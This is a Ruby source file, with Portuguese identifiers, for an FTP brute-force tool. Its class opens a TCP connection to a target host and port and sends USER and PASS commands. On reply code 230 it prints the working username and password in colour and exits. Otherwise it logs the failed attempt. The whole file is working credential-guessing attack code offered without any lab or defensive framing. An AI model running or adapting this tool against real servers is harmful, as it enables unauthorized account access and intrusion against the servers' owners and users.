#coding:utf-8
load "cor.rb"
require "socket"

class Bruteforce

	def host=(host)
		@host = host
	end

	def host()
		@host
	end
	
	def initServer()
		@servidor = TCPSocket.open(host, porta)
		@servidor.recvfrom(1024)
	end

	def porta()
		@porta
	end
	
	def senha()
		@senha
	end

	def senha=(senha)
		@senha = senha
	end

	def porta=(porta)
		@porta = porta
	end

	def user=(user)
		@user = user
	end

	def user
		@user
	end

	def initialize(*args)
		@tents = 1
		@cor = Cor.new()
		self.host=(args[0] || nil)
		self.porta=(Integer(args[1]) || 21)
		self.user = args[2] || "Anonymous"
	end

	def login()



		@servidor.puts "USER #{self.user}"
		resp = @servidor.recvfrom(1024)

		@servidor.puts "PASS #{self.senha}"
		resps = @servidor.recvfrom(1024)
		rsp = resps[0][0..3]
		if Integer(rsp) == 230
			puts "#{@cor.verde}LOGIN EFETUADO COM SUCESSO"
			puts "#{@cor.branco}User: #{@cor.cyan}#{self.user}"
			puts "#{@cor.branco}Senha:#{@cor.cyan} #{self.senha}"
			exit()
		else
			puts "#{@cor.vermelho}Tentativa #{@tents} falhada: #{@cor.branco}#{self.senha}"
			@tents += 1
			@servidor.close()

		end
		rescue Exception => e
			puts "#{@cor.vermelho}Saindo..."
			exit(0)
	end

end
